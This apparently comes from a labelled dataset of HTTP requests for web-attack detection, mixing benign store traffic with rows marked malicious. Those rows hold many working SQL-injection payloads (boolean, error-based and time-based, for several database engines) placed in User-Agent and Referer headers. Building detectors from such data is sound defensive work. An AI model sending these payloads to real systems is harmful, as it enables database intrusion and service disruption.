method,url,uri,query,headers,body,type
GET,/tienda1/publico/autenticar.jsp,/tienda1/publico/autenticar.jsp,modo=entrar&login=leigh&pwd=2a045t8&remember=on&B1=Entrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=7129D5F568E513D62B84422BE5F8491B,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: -1435"")) OR 3481=7043#
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5'))) AND 1597=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) AND ((('fYle' LIKE 'fYle
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/caracteristicas.jsp,/tienda1/publico/caracteristicas.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=AA81D1E8EB760DEC991ADFDA97C5E559,id=1,benign
POST,/tienda1/publico/caracteristicas.jsp,/tienda1/publico/caracteristicas.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=9DAC17A2D2F888DF3A648ACE9FA4655C,id=1,benign
GET,/tienda1/publico/autenticar.jsp,/tienda1/publico/autenticar.jsp,modo=entrar&login=walpole&pwd=6a6050ar&remember=on&B1=Entrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=8B9F591536B088C69254BF4FAC4C4FA1,,benign
POST,/tienda1/publico/pagar.jsp,/tienda1/publico/pagar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=CF2E9A56E47788A174D217D4DF3942F2,modo=insertar&precio=1640&B1=Confirmar,benign
GET,/tienda1/index.jsp,/tienda1/index.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=CD84CABD3B73D1CC46A1AADE8FDEF535,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/' AND 7846=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'aHfD'='aHfD
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5))) AND 3951=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND (((1236=1236
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/caracteristicas.jsp,/tienda1/publico/caracteristicas.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=78ADD42371D73623453B337277131D55,id=2,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5"") OR CHAR(83)||CHAR(68)||CHAR(105)||CHAR(88)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL) AND (""dwgI""=""dwgI
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5) OR 2620=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- KVKM
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5') OR 2252=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) AND ('IvBl'='IvBl
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5))) OR (SELECT 4210 FROM (SELECT(SLEEP(5)))zadA)#
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/caracteristicas.jsp,/tienda1/publico/caracteristicas.jsp,id=2,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=A4F5FDFEBC8E04221575A09852850481,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5) AND CHAR(119)||CHAR(84)||CHAR(105)||CHAR(74)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL)-- xXvm
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/global/titulo.jsp,/tienda1/global/titulo.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=FFE60CF7E5257087FF43ED05F841BCFB,,benign
POST,/tienda1/publico/vaciar.jsp,/tienda1/publico/vaciar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=7BF9AE7486FB46C1A1C9DBA9C3AB1262,B2=Vaciar+carrito,benign
POST,/tienda1/publico/entrar.jsp,/tienda1/publico/entrar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=FC2C908589C7E140A7016DF90BEA4937,errorMsg=Credenciales+incorrectas,benign
GET,/tienda1/imagenes/nuestratierra.jpg,/tienda1/imagenes/nuestratierra.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=57DBDFC8556B7FBEFE6F1AB73056A394,,benign
POST,/tienda1/publico/caracteristicas.jsp,/tienda1/publico/caracteristicas.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=6EF757A0D758357CB315DD8913069E00,id=2,benign
POST,/tienda1/publico/registro.jsp,/tienda1/publico/registro.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=23506973D37BA7B7871EA9CF046FFD4F,modo=registro&login=visockis2&password=21co4pr2si684&nombre=Yasmila&apellidos=Razquin&email=wagonheim-rabel%40hipergipuzkoa.mil&dni=26506655Y&direccion=Calle+Caribe%2C+187%2C+10-D&ciudad=Santiago+del+Campo&cp=42165&provincia=Cuenca&ntc=0365839887327935&B1=Registrar,benign
GET,/tienda1/imagenes/1.gif,/tienda1/imagenes/1.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=5D77CD68BF2B6E6BCDCF1CB66A09C7FC,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5)) OR CHAR(83)||CHAR(68)||CHAR(105)||CHAR(88)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL) AND ((7935=7935
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/pagar.jsp,/tienda1/publico/pagar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=91C53380BDFBDB67AC4B226D5A3FFC7B,modo=insertar&precio=1029&B1=Confirmar,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/"" AND 9103=5361%16
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/' HAVING 1262=2525 OR 'DGYS'='Iwpe
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5"")) RLIKE SLEEP(5) AND ((""ninb"" LIKE ""ninb
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/vaciar.jsp,/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=666DB7E9AC72069505AACE002C9B9CD5,,benign
GET,/tienda1/imagenes/logo.gif,/tienda1/imagenes/logo.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=357B3551ACD21164261AD4DCFDE59321,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: -7631%' OR (SELECT (CASE WHEN (8586=8586) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8586) END) FROM DUAL) IS NULL AND 'GcHe%'='GcHe
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/caracteristicas.jsp,/tienda1/publico/caracteristicas.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=7338E5E6593144918538E647672F7E03,id=1,benign
GET,/tienda1/miembros/editar.jsp,/tienda1/miembros/editar.jsp,modo=registro&login=dialout&password=3ra41&nombre=Doncel&apellidos=De+Hernandez+Ayestar%E1n&email=anka.mayll%40botilleria.com.ci&dni=86990486R&direccion=Foix+147%2C+&ciudad=Teruel&cp=40599&provincia=Barcelona&ntc=1560160893774975&B1=Registrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=1BB6AA7947BCB008016629AA13A6DC8F,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5' AND 1982=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND 'fNcb'='fNcb
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/miembros/imagenes/zarauz.jpg,/tienda1/miembros/imagenes/zarauz.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=AB0428B6C7B260E22012C9F7E0E977D3,,benign
GET,/tienda1/global/creditos.jsp,/tienda1/global/creditos.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=4BD3B01AFEE04E341A06A19C5780EBCB,,benign
GET,/tienda1/publico/caracteristicas.jsp,/tienda1/publico/caracteristicas.jsp,id=2,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=45CD649475E5DE26B536CD5D0593A794,,benign
POST,/tienda1/publico/pagar.jsp,/tienda1/publico/pagar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=D1A94EA3792AAB58576C8AAC4E08C69C,modo=insertar&precio=9316&B1=Pasar+por+caja,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: -4454' OR MAKE_SET(3355=4629,4629) OR 'TVND'='OOQD
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5 OR 4982=BENCHMARK(5000000,MD5(0x76417372))
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/registro.jsp,/tienda1/publico/registro.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=4BA95AE79D754BF36178649FBC1A5E88,modo=registro&login=annibale9&password=SObrexCITaR&nombre=Almudena&apellidos=Ciutad+Pires&email=kryzanek%40cincocolores.ma&dni=17574066L&direccion=Paseo+Buenos+Aires+121+6D&ciudad=Castellv%ED+de+Rosanes&cp=32700&provincia=Zamora&ntc=3933531193638838&B1=Registrar,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/') AS Ekkx WHERE 5073=5073 WAITFOR DELAY '0:0:5'-- jXdn
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/anadir.jsp,/tienda1/publico/anadir.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=500C5F026FB9234E1E8C564380999E08,id=1&nombre=Queso+Manchego&precio=85&cantidad=41&B1=A%F1adir+al+carrito,benign
POST,/tienda1/publico/registro.jsp,/tienda1/publico/registro.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=0B88784F6A977E2BDC8050381855F8EA,modo=registro&login=greaney&password=28RtI5A960&nombre=Fadrique&apellidos=Gasc%F3+Chilel&email=hinson5%40soycatalan.mg&dni=93881092Z&direccion=C%2F+Ganekogorta+71%2C+11C&ciudad=Alonsotegi&cp=31671&provincia=Granada&ntc=0697225242542451&B1=Registrar,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/"" WAITFOR DELAY '0:0:5' AND ""twFn"" LIKE ""twFn
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5' AND CHAR(103)||CHAR(122)||CHAR(108)||CHAR(104)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(6624),0),5000000000),NULL)-- gacx
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5) AS JQFg WHERE 9830=9830 OR 3984=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))-- qnGh
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: -3430"" OR (SELECT (CASE WHEN (5704=5595) THEN NULL ELSE CAST((CHR(82)||CHR(99)||CHR(122)||CHR(71)) AS NUMERIC) END)) IS NULL AND ""dTYT"" LIKE ""dTYT
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/miembros/fotos.jsp,/tienda1/miembros/fotos.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=DEBD70130F00B1E6431F174FEE60E113,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/ HAVING 2973=1469-- Qbur
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/imagenes/nuestratierra.jpg,/tienda1/imagenes/nuestratierra.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=420F284A2ED733D54F9E84FE2E09F5E6,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5,(BEGIN IF (8241=8241) THEN DBMS_LOCK.SLEEP(5); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: -3357') OR ELT(9358=5309,5309) AND ('imem'='imem
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
